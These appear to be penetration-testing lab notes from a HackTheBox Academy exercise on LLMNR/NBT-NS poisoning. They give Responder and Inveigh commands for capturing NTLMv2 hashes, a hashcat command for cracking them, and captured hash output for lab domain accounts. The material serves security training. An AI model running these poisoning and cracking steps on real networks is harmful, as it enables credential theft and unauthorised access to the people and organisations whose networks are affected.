# LLMNR and NBT-NS Poisoning

## Primer

| PROTOCOL | FALLBACK |
|---|---|
| DNS | LLMNR |
| LLMNR | NBT-NS |

## Linux

### Responder

```sh
htb-student@ea-attack01:~$ sudo Responder.py -I ens224
```

```output title="Output" hl_lines="13-15"
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\lab_adm
[SMB] NTLMv2-SSP Hash     : lab_adm::INLANEFREIGHT:404283c1deb6f8f5:DB08DC6BFA61156F66A72B53E797491F:
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\clusteragent
[SMB] NTLMv2-SSP Hash     : clusteragent::INLANEFREIGHT:0fb3910c7ae633b7:F6EB814E368F8DFF95FF3DCB3335EA38:
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:405dc630f264f46e:2EB0EB221415A828542BC87D7122CD74:
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\forend
[SMB] NTLMv2-SSP Hash     : forend::INLANEFREIGHT:dc6e3264d1dafe09:7622D12CB4A1B4348AF23BDA9A0991B4:
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley
[SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:3e2c5a8d40926168:7137FB7F41F038FF97CA1354772C6586:
```

### Cracking the Hash

```sh
htb-student@ea-attack01:~$ hashcat --hwmon-disable -a 0 -m 5600 wley.hash /usr/local/share/wordlists/rockyou.txt
```

## Windows

### Inveigh [PowerShell](https://github.com/Kevin-Robertson/Inveigh/wiki)

```pwsh
PS C:\Users\htb-student> Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### Inveigh [C#](https://github.com/Kevin-Robertson/Inveigh)

```pwsh
PS C:\Users\htb-student> C:\Tools\Inveigh.exe
```

#### HELP

```pwsh
C(0:0) NTLMv1(0:0) NTLMv2(5:17)> HELP
```

```output title="Output"
========================================================================================================================== Inveigh Console Commands ===========================================================================================================================

Command                           Description
===============================================================================================================================================================================================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
GET REPLYTOHOSTS                | get ReplyToHosts parameter startup values
GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
GET IGNOREHOSTS                 | get IgnoreHosts parameter startup values
GET IGNOREIPS                   | get IgnoreIPs parameter startup values
SET CONSOLE                     | resume real time console output
STOP                            | stop Inveigh
```

#### GET NTLMV2USERNAMES

```pwsh
C(0:0) NTLMv1(0:0) NTLMv2(5:17)> GET NTLMV2USERNAMES
```

```output title="Output"
============================================================================================================================== NTLMv2 Usernames ===============================================================================================================================

IP Address                        Host                              Username                          Challenge
===============================================================================================================================================================================================================================================================================
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\lab_adm           | 48EF8FB27F07C580
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\clusteragent      | 2C97291F1E0E4F35
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\wley              | FCCACA4A76F8AA59
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys        | B17783A3644721CB
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\forend            | C8C28AC413D6C028
```

#### GET NTLMV2UNIQUE

```pwsh
C(0:0) NTLMv1(0:0) NTLMv2(5:17)> GET NTLMV2UNIQUE
```

```output title="Output"
============================================================================================================================ Unique NTLMv2 Hashes =============================================================================================================================

Hashes
===============================================================================================================================================================================================================================================================================
lab_adm::INLANEFREIGHT:48EF8FB27F07C580:77DBD01D38DA31DC092929BD96B32DE4:
clusteragent::INLANEFREIGHT:2C97291F1E0E4F35:E2F174171363A05B365FBFD71C946112:
wley::INLANEFREIGHT:FCCACA4A76F8AA59:41C390CAA76B3A232714384ED59C7925:
svc_qualys::INLANEFREIGHT:B17783A3644721CB:30111D523325256E8C9B4E9E981243EA:
forend::INLANEFREIGHT:C8C28AC413D6C028:2E01FED26C42BDF161298F58E1386429:
```
